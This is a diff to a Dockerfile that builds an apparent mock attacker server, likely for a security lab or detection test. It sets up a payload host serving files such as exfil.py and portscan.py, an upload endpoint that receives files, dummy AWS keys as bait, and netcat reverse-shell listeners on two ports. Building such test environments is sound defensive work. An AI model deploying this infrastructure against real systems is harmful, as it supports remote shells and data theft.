@@ -17,8 +17,8 @@ RUN mkdir -p /payloads/uploads /payloads/shells
 COPY xmx2 www cc.py pt xmx2.so run.sh noumt config.json exfil.py portscan.py /payloads/
 RUN chmod +x /payloads/*
 
-RUN echo '{"RoleName":"example-k8s-admin-role"}' > /payloads/iam-role && \
-    echo '{"AccessKeyId":"AKIAEXAMPLE"}' > /payloads/aws-keys
+RUN echo '{"RoleName":"dummy-k8s-cluster-role"}' > /payloads/iam-role.json && \
+    echo '{"AccessKeyId":"AKIADUMMYDUMMYDUMMY","SecretAccessKey":"dummysecretkey1234567890abcdefghijklmnop"}' > /payloads/aws-keys.json
 
 EXPOSE $HTTP_PORT $SHELL_PORT_1 $SHELL_PORT_2 4445
 
@@ -45,7 +45,8 @@ class Handler(http.server.BaseHTTPRequestHandler):\n\
     def do_GET(self):\n\
         log(f"GET {self.path}")\n\
         try:\n\
-            filepath = f"/payloads{self.path if self.path != "/" else "/index.html"}"\n\
+            path = self.path if self.path != "/" else "/index.html"\n\
+            filepath = f"/payloads{path}"\n\
             if os.path.exists(filepath) and os.path.isfile(filepath):\n\
                 with open(filepath, "rb") as f:\n\
                     self.send_response(200)\n\
@@ -70,7 +71,9 @@ class Handler(http.server.BaseHTTPRequestHandler):\n\
             if "file" in form:\n\
                 item = form["file"]\n\
                 if item.file:\n\
-                    fname = f"{ts}_{item.filename if hasattr(item, \"filename\") and item.filename else \"data.bin\"}"\n\
+                    default_name = "data.bin"\n\
+                    filename = item.filename if hasattr(item, "filename") and item.filename else default_name\n\
+                    fname = f"{ts}_{filename}"\n\
                     fpath = os.path.join(UPLOAD_DIR, fname)\n\
                     with open(fpath, "wb") as f:\n\
                         f.write(item.file.read())\n\
@@ -104,10 +107,14 @@ with socketserver.TCPServer(("", PORT), Handler) as httpd:\n\
     httpd.serve_forever()\n' > /payloads/server.py && chmod +x /payloads/server.py
 
 RUN echo '#!/bin/bash\n\
+set -ex\n\
+echo "=== Entrypoint starting ==="\n\
 NC_BIN=$(command -v nc.traditional || command -v nc.openbsd || command -v nc)\n\
-echo "Starting listeners on ports $SHELL_PORT_1, $SHELL_PORT_2"\n\
+echo "Starting reverse shell listeners on ports $SHELL_PORT_1, $SHELL_PORT_2"\n\
 while true; do $NC_BIN -l -p $SHELL_PORT_1 -v 2>&1 | tee -a /payloads/shells/shell_$SHELL_PORT_1.log; sleep 1; done &\n\
 while true; do $NC_BIN -l -p $SHELL_PORT_2 -v 2>&1 | tee -a /payloads/shells/shell_$SHELL_PORT_2.log; sleep 1; done &\n\
-cd /payloads && python3 server.py\n' > /entrypoint.sh && chmod +x /entrypoint.sh
+echo "=== Starting HTTP server on port $HTTP_PORT ==="\n\
+cd /payloads\n\
+exec python3 -u server.py\n' > /entrypoint.sh && chmod +x /entrypoint.sh
 
 CMD ["/entrypoint.sh"]
